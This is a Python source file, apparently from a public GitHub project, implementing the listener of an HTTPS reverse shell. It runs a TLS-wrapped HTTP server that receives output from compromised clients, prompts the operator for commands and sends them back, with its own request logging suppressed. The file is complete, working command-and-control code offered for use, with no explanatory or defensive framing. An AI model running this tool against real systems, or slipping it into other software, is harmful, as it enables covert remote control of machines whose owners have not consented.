#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-Basic-HTTPS-Reverse-Shell

__author__ = "EONRaider @ keybase.io/eonraider"

import json
import ssl
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from urllib.parse import parse_qs


class ShellHandler(BaseHTTPRequestHandler):
    def _set_headers(self, response_code: int = 200) -> None:
        self.send_response(response_code)
        self.end_headers()

    def do_GET(self) -> None:
        self.send_header("Content-type", "application/json")
        self._set_headers()
        self.wfile.write(json.dumps({"status": "ok"}).encode())

    def do_POST(self) -> None:
        length = int(self.headers.get("Content-Length"))
        request_body: dict[str, list[str]] = parse_qs(
            self.rfile.read(length).decode())
        for mode, args in request_body.items():
            try:
                getattr(self, f"_{mode}")(args)
            except AttributeError:
                self._set_headers(404)

    def _prompt(self, client_output: list[str]) -> None:
        gc, nc = "\x1b[0;32m", "\x1b[0m"  # Green color, no color
        shell = "{0}[{1}:{2}]{3} {4}".format(gc, *self.client_address,
                                             nc, *client_output)
        try:
            response = input(shell)
        except EOFError:
            raise KeyboardInterrupt
        self._set_headers()
        self.wfile.write(response.encode())

    def _output(self, client_output: list[str]) -> None:
        print(*client_output, end="")
        self._set_headers()

    def log_message(self, *args, **kwargs):
        """Suppress display of log messages on STDOUT."""
        pass


class ShellServer:
    def __init__(self, host: str, port: int, certfile: [str, Path]):
        self._host = host
        self._port = port
        self._certfile = certfile
        self.server_address = self._host, self._port

    @property
    def _certfile(self) -> Path:
        return self.__certfile

    @_certfile.setter
    def _certfile(self, path: [str, Path]):
        self.__certfile = Path(path)
        if not self.__certfile.exists():
            raise FileNotFoundError("Error: A server certificate is required "
                                    "to start the application.")

    def execute(self) -> None:
        with HTTPServer(self.server_address, ShellHandler) as httpd:
            try:
                print("[+] Server started on https://{0}:{1}".format(
                    *self.server_address))
                print("[+] Waiting for connections...\n")
                httpd.socket = ssl.wrap_socket(sock=httpd.socket,
                                               server_side=True,
                                               certfile=str(self._certfile),
                                               ssl_version=ssl.PROTOCOL_TLS)
                httpd.serve_forever()
            except KeyboardInterrupt:
                print("\n[!] Shutting down the server...")


if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(
        description="Basic HTTPS Reverse Shell Server")
    parser.add_argument("--host",
                        type=str,
                        default="localhost",
                        metavar="<hostname>",
                        help="Server address or hostname.")
    parser.add_argument("-p", "--port",
                        type=int,
                        default=4443,
                        metavar="<port>",
                        help="Port number to bind the server to.")
    parser.add_argument("--certfile",
                        type=str,
                        default=None,
                        metavar="<path>",
                        help="Absolute path to a file containing the "
                             "server's certificate.")
    _args = parser.parse_args()

    ShellServer(host=_args.host,
                port=_args.port,
                certfile=_args.certfile).execute()
